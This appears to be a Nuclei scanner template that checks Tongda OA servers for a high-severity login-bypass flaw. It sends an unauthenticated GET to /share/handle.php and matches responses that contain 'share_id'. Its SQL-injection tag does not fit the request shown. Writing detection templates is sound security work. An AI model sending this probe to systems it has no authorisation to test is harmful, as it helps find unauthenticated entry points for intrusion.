id: tongda-OA-dengluraoguo

info:
  name: tongda-OA-dengluraoguo
  author: msk
  severity: high
  reference: https://mp.weixin.qq.com/s/CyoSdjJOnBwmlkcOn0_Smg
  tags: tongdaOA,sql,injection


http:
  - raw:
      - |+
        GET /share/handle.php?module=2&module_id=1 HTTP/1.1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
        Host:{{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"share_id")